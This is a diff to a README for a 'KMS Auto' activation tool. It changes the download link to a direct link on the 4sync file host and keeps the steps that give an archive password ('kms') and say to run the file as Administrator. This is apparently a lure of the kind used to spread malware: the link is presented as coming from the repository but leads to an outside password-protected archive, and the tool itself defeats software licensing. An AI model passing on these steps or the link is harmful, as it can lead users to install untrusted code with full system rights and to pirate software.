@@ -22,7 +22,7 @@
 
 ## 🔧 Installation
 
-1. [Download](https://www.4sync.com/rar/9iZJmTiv/KMSAuto.html) the latest version from this repository
+1. [Download](https://www.4sync.com/web/directDownload/9iZJmTiv/cKQ38aak.bf8e6b82bfe789c592717e0e0935d1bf) the latest version from this repository
 2. Password **kms**
 3. Right-click the mod menu and select **"Run as Administrator"**  
 4. Launch **KMS Auto** and follow on-screen instructions
